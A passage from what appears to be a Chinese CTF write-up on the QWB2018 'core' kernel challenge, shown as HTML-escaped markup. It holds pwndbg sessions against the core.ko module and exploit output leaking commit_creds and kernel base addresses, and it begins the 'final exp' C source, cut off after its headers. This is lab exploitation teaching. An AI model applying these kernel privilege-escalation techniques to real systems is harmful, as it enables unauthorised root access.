+Reading symbols from ./core.ko...&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;no debugging symbols found&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;...done.
+pwndbg&amp;gt; b core_read					&lt;span class=&#34;c1&#34;&gt;# 加载了符号表，就可以直接对函数下断点了
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;Breakpoint &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; at 0xffffffffc018b063
+pwndbg&amp;gt; b *&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0xffffffffc018b000+0xCC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# 或者根据基地址直接下断点
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;Breakpoint &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; at 0xffffffffc018b0cc
+pwndbg&amp;gt; target remote localhost:1234
+Remote debugging using localhost:1234
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+0xffffffffa1e6e7d2 in ?? &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+LEGEND: STACK &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; HEAP &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; CODE &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; DATA &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; RWX &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; RODATA
+──────────────────────────────────────&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; REGISTERS &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;──────────────────────────────────────
+ RAX  0xffffffffa1e6e7d0 ◂— sti     /* 0x2e66001f0fc3f4fb */
+ RBX  0xffffffffa2810480 ◂— 0x80000000
+ RCX  0x0
+ RDX  0x0
+ RDI  0x0
+ RSI  0x0
+ R8   0xffff8f250641bf20 —▸ 0xffffb0f380647960 ◂— &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+ R9   0x0
+ R10  0x0
+ R11  0x32e
+ R12  0xffffffffa2810480 ◂— 0x80000000
+ R13  0xffffffffa2810480 ◂— 0x80000000
+ R14  0x0
+ R15  0x0
+ RBP  0x0
+ RSP  0xffffffffa2803eb8 —▸ 0xffffffffa16b65a0 ◂— 0xff894cf6894c9feb
+ RIP  0xffffffffa1e6e7d2 ◂— ret     /* 0x1f0f2e66001f0fc3 */
+───────────────────────────────────────&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; DISASM &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;────────────────────────────────────────
+ ► 0xffffffffa1e6e7d2    ret    &amp;lt;0xffffffffa16b65a0&amp;gt;
+    ↓
+   0xffffffffa16b65a0    jmp    0xffffffffa16b6541
+    ↓
+   0xffffffffa16b6541    or     byte ptr ds:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;r12 + &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, 0x20
+   0xffffffffa16b6548    pushfq
+   0xffffffffa16b6549    pop    rax
+   0xffffffffa16b654a    &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;   ah, &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
+   0xffffffffa16b654d    je     0xffffffffa16b65e5
+
+   0xffffffffa16b6553    call   0xffffffffa16d4720
+
+   0xffffffffa16b6558    call   0xffffffffa16b6430
+
+   0xffffffffa16b655d    mov    rax, qword ptr &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;rbx&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+   0xffffffffa16b6560    &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;   al, &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt;
+────────────────────────────────────────&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; STACK &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;────────────────────────────────────────
+&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;:0000│ rsp  0xffffffffa2803eb8 —▸ 0xffffffffa16b65a0 ◂— 0xff894cf6894c9feb
+&lt;span class=&#34;m&#34;&gt;01&lt;/span&gt;:0008│      0xffffffffa2803ec0 ◂— 0xc2
+&lt;span class=&#34;m&#34;&gt;02&lt;/span&gt;:0010│      0xffffffffa2803ec8 —▸ 0xffffffffa2cc4900 ◂— 0xcccccccccccccccc
+&lt;span class=&#34;m&#34;&gt;03&lt;/span&gt;:0018│      0xffffffffa2803ed0 —▸ 0xffff8f2506688900 ◂— jb     0xffff8f2506688971 /* 0x65642f3d746f6f72&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;root=/dev/ram&amp;#39;&lt;/span&gt; */
+&lt;span class=&#34;m&#34;&gt;04&lt;/span&gt;:0020│      0xffffffffa2803ed8 —▸ 0xffffffffa2ccc2c0 ◂— 0xcccccccccccccccc
+&lt;span class=&#34;m&#34;&gt;05&lt;/span&gt;:0028│      0xffffffffa2803ee0 ◂— 0x0
+... ↓
+&lt;span class=&#34;m&#34;&gt;07&lt;/span&gt;:0038│      0xffffffffa2803ef0 —▸ 0xffffffffa16b673a ◂— jmp    0xffffffffa16b6735 /* 0x564190909090f9eb */
+pwndbg&amp;gt; c
+Continuing.
+......
+......
+
+
+// qemu 内
+/ &lt;span class=&#34;c1&#34;&gt;# /tmp/exploit
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;status has been saved.
+commit_creds addr: 0xffffffffa169c8e0
+vmlinux_base addr: 0xffffffffa1600000
+prepare_kernel_cred addr: 0xffffffffa169cce0
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; off to &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; to buf.
+......
+......
+
+// qemu 外
+pwndbg&amp;gt; c
+Continuing.
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+
+Breakpoint &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;, 0xffffffffc018b063 in core_read &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+LEGEND: STACK &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; HEAP &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; CODE &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; DATA &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; RWX &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; RODATA
+──────────────────────────────────────&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; REGISTERS &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;──────────────────────────────────────
+ RAX  0xffffffffc018b15f &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;core_ioctl&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ◂— cmp    esi, 0x6677889b /* 0x48536677889bfe81 */
+ RBX  0x7ffee6e56f10 ◂— &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
+ RCX  0x0
+ RDX  0x7ffee6e56f10 ◂— &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
+ RDI  0x7ffee6e56f10 ◂— &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
+ RSI  0x6677889b
+ R8   0xffff8f25071b38ac ◂— &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+ R9   0x1
+ R10  0x0
+ R11  0x0
+ R12  0xffff8f250540b7a0 ◂— mov    dh, 0x81 /* 0x581b6 */
+ R13  0x6677889b
+ R14  0x7ffee6e56f10 ◂— &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
+ R15  0x0
+ RBP  0x7ffee6e56f10 ◂— &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
+ RSP  0xffffb0f3800dbe68 —▸ 0xffffffffc018b19b &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;core_ioctl+60&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ◂— 0xc7c748d6894818eb
+ RIP  0xffffffffc018b063 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;core_read&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ◂— push   rbx /* 0x7bc7c748fb894853 */
+───────────────────────────────────────&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; DISASM &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;────────────────────────────────────────
+ ► 0xffffffffc018b063 &amp;lt;core_read&amp;gt;       push   rbx
+   0xffffffffc018b064 &amp;lt;core_read+1&amp;gt;     mov    rbx, rdi
+   0xffffffffc018b067 &amp;lt;core_read+4&amp;gt;     mov    rdi, -0x3fe73f85
+   0xffffffffc018b06e &amp;lt;core_read+11&amp;gt;    sub    rsp, 0x48
+   0xffffffffc018b072 &amp;lt;core_read+15&amp;gt;    mov    rax, qword ptr gs:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x28&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+   0xffffffffc018b07b &amp;lt;core_read+24&amp;gt;    mov    qword ptr &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;rsp + 0x40&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, rax
+   0xffffffffc018b080 &amp;lt;core_read+29&amp;gt;    xor    eax, eax
+   0xffffffffc018b082 &amp;lt;core_read+31&amp;gt;    call   0xffffffffa16c6845
+
+   0xffffffffc018b087 &amp;lt;core_read+36&amp;gt;    mov    rsi, qword ptr &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;rip + 0x2b72&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+   0xffffffffc018b08e &amp;lt;core_read+43&amp;gt;    mov    rdx, rbx
+   0xffffffffc018b091 &amp;lt;core_read+46&amp;gt;    mov    rdi, -0x3fe73f6b
+────────────────────────────────────────&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; STACK &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;────────────────────────────────────────
+&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;:0000│ rsp  0xffffb0f3800dbe68 —▸ 0xffffffffc018b19b &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;core_ioctl+60&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ◂— 0xc7c748d6894818eb
+&lt;span class=&#34;m&#34;&gt;01&lt;/span&gt;:0008│      0xffffb0f3800dbe70 —▸ 0xffff8f25071b3840 ◂— add    qword ptr &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;r8&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, rax /* 0x81b6f000014b */
+&lt;span class=&#34;m&#34;&gt;02&lt;/span&gt;:0010│      0xffffb0f3800dbe78 —▸ 0xffffffffa17dd6d1 ◂— 0xe824048948df8948
+&lt;span class=&#34;m&#34;&gt;03&lt;/span&gt;:0018│      0xffffb0f3800dbe80 ◂— 0x889b
+&lt;span class=&#34;m&#34;&gt;04&lt;/span&gt;:0020│      0xffffb0f3800dbe88 —▸ 0xffff8f2507680d00 ◂— &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
+&lt;span class=&#34;m&#34;&gt;05&lt;/span&gt;:0028│      0xffffb0f3800dbe90 —▸ 0xffffffffa178ecfa ◂— 0x9e840ffffffdfd3d
+&lt;span class=&#34;m&#34;&gt;06&lt;/span&gt;:0030│      0xffffb0f3800dbe98 —▸ 0xffffb0f3800dbe70 —▸ 0xffff8f25071b3840 ◂— add    qword ptr &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;r8&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, rax /* 0x81b6f000014b */
+&lt;span class=&#34;m&#34;&gt;07&lt;/span&gt;:0038│      0xffffb0f3800dbea0 ◂— 0x10
+Breakpoint core_read
+pwndbg&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;最终 exp&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;lnt&#34;&gt;  1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;110
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;111
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;112
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;113
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;114
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;115
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;116
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;117
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;118
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;119
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;120
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;121
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;122
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;123
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;124
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;125
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;126
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;127
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;128
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;129
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;130
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;131
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;132
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;133
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;134
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;135
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;136
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;137
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;138
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;139
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;140
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;141
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;142
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;143
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;144
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;145
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;146
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;147
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;148
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;149
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;150
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;151
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;152
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;153
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;154
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;155
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;156
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;157
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;158
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;159
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;160
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;161
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;162
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;163
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;164
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;165
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;166
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;167
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;168
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;169
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;170
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;171
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;172
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;173
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;174
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;175
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;176
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;177
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;178
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;179
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;180
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;181
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;182
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;183
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;184
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;185
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;186
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;n&#34;&gt;QWB2018_core&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;master&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;●●&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cat&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exploit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; 
+&lt;span class=&#34;c1&#34;&gt;// gcc exploit.c -static -masm=intel -g -o exploit
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;sys/ioctl.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
